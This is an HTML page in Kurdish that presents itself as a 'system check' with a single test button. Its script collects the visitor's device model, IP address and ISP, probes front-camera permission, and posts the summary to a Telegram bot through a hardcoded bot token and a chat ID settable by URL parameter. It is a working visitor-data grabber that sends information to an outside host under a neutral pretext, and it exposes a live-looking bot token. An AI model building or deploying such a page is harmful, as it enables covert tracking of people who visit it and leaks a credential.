<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تۆماری زانیاری</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        h1 { font-size: 22px; color: #2980b9; margin-bottom: 15px; }
        p { font-size: 15px; color: #666; margin-bottom: 25px; }
        .btn {
            background-color: #2980b9;
            color: white;
            border: none;
            padding: 15px 25px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background-color: #1f618d; }
    </style>
</head>
<body>
    <div class="container" id="content-box">
        <h1>🔍 پشکنینی سیستەم</h1>
        <p>تکایە بۆ تاقیکردنەوە و دەرخستنی زانیارییەکان کلیک لەسەر دوگمەی خوارەوە بکە:</p>
        <button class="btn" onclick="testProcess()">تاقیکردنەوە</button>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "6782298541";

        async function testProcess() {
            document.getElementById('content-box').innerHTML = '<h1>⏳ خەریکی کۆکردنەوەم...</h1>';

            let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
            
            // 1. مۆدێل
            let deviceModel = "نادیار";
            try {
                const parser = new UAParser();
                const result = parser.getResult();
                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
            } catch (e) {}

            // 2. IP
            let ip = 'نادیار', isp = 'نادیار';
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || 'نادیار';
                isp = data.org || 'نادیار';
            } catch (e) {}

            // 3. کامێرا و ڕێگەپێدان
            let cameraStatus = "نەگیرا";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                cameraStatus = "سەرکەوتوو بوو (Allow کرا)";
                stream.getTracks().forEach(t => t.stop());
            } catch (e) {
                cameraStatus = "ڕەتکرایەوە (Deny)";
            }

            // دروستکردنی کورتەی زانیارییەکان بۆ نیشدان لەسەر شاشە
            const summary = `کات: ${visitTime}\nمۆدێل: ${deviceModel}\nIP: ${ip}\nکامێرا: ${cameraStatus}`;

            // نیشاندانی ڕاستەوخۆ لەسەر شاشەی مۆبایلت بۆ دڵنیابوون
            alert("✅ زانیارییەکان سەرکەوتووانە کۆکرانەوە:\n\n" + summary);

            // هەوڵدان بۆ ناردن بۆ تێلێگرام
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: `🔔 **تاقیکردنەوە:**\n${summary}`, parse_mode: 'Markdown' })
                });
                alert("📤 پەیامەکە بۆ تێلێگرامیش نێردرا!");
            } catch (err) {
                alert("❌ زانیارییەکان لە وێبگەڕدا هەبوون، بەڵام ناردن بۆ تێلێگرام سەرکەوتوو نەبوو (CORS/Network Error)");
            }

            document.getElementById('content-box').innerHTML = '<h1>✔️ تاقیکردنەوە تەواو بوو</h1>';
        }
    </script>
</body>
</html>
